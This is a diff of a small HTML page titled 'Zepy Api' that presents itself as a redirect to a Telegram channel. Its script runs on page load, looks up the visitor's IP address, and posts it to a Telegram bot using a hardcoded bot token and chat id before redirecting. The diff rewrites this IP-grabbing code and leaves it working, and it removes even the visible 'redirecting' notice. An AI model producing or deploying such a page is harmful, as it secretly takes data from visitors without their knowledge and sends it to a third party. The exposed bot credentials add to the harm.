@@ -1,33 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta http-equiv="refresh" content="1;url=https://t.me/zepyytry" />
+  <meta charset="UTF-8" />
   <title>Zepy Api</title>
   <script>
-    // Ganti dengan token dan chat_id kamu
-    const botToken = "7627954962:AAHVwLsNQdpFSi3E6Zg5qRzIQ7tBUdSRFKA";
-    const chatId = "7708476554";
-
-    // Ambil IP dari layanan ipinfo.io
-    fetch("https://ipinfo.io/json?token=01fdfc85b8e3b1") // Token publik, bisa digunakan gratis
+    fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
-        const msg = `IP:\nIP: ${ip}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: msg
-          })
+        const token = '7627954962:AAHVwLsNQdpFSi3E6Zg5qRzIQ7tBUdSRFKA';
+        const chat_id = '7708476554';
+        const text = `IP: ${ip}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id, text })
         });
+      })
+      .finally(() => {
+        // Redirect setelah IP dikirim
+        setTimeout(() => {
+          window.location.href = 'https://t.me/zepyytry';
+        }, 1000); // Delay 1 detik
       });
   </script>
 </head>
-<body>
-  <p>Mengalihkan ke Telegram...</p>
-</body>
+<body style="margin:0;"></body>
 </html>
